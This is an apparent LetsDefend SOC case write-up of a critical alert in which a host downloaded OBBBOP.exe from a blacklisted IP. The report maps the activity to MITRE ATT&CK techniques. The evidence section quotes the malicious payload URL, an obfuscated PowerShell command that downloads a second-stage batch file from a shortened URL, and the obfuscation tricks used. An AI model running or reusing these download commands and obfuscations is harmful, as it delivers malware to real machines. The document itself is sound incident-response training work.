---
type: soc-case
platform: letsdefend
status: closed
severity: critical
tags:
  - mitre/T1204-002
  - mitre/T1105
  - mitre/T1059-001
  - mitre/T1071-001
  - mitre/T1027
date: 2026-03-29
MITRE ATT&CK:
outcome: true-positive
alert_id: SOC112
title: Traffic to Blacklisted IP
youtube: https://www.youtube.com/watch?v=22GrGEWL_Iw
---
MITRE ATT&CK Mapping  
  
T1105 – Ingress Tool Transfer  
Initial payload downloaded from external IP:  
http://193.239.147.32/OBBBOP.exe  
  
T1059.001 – Command and Scripting Interpreter: PowerShell  
Execution of obfuscated PowerShell command:  
(New-Object Net.WebClient).DownloadFile(...)  
  
T1204.002 – User Execution: Malicious File  
User/system executed downloaded executable OBBBOP.exe  
  
T1071.001 – Application Layer Protocol: Web Protocols  
Communication over HTTP for payload delivery  
  
T1027 – Obfuscated Files or Information  
Use of obfuscation in PowerShell command (po^wershe^ll, nEw-oB`jecT)

Incident Summary
A critical alert was triggered after host Jack (172.16.17.21) accessed a known blacklisted IP and downloaded a malicious executable (OBBBOP.exe). Execution of the payload initiated a PowerShell-based follow-on stage attempting to retrieve an additional payload from a known malicious URL. The activity indicates a confirmed malware infection attempt with partial execution.

Evidence
- Proxy logs confirm access to:
  http://193.239.147.32/OBBBOP.exe
- User-Agent indicates PowerShell execution:
  Mozilla/5.0 ... PowerShell/6.0.0
- Endpoint telemetry shows execution of obfuscated PowerShell command:
  cmd /c powershell -w 1 (New-Object Net.WebClient).DownloadFile(http://rebrand.ly/WdBPApoMACRO,a.bat)
- VirusTotal confirms:
  - 193.239.147.32 is a blacklisted/malicious IP
  - http://rebrand.ly/WdBPApoMACRO is malicious
- No outbound connection observed to:
  - rebrand.ly
  - 18.245.113.42 (resolved IP)

Impact
The endpoint successfully downloaded and executed an initial malicious payload, confirming compromise at least at the initial stage. The second-stage payload download did not complete, reducing the likelihood of full attacker capability deployment. However, the system must be considered compromised due to execution of malicious code.

Action Taken
- Endpoint isolated to prevent further communication
- Malicious domains and IPs identified for blocking
- Investigation confirms no successful second-stage download
- Escalation recommended for full endpoint remediation and forensic analysis
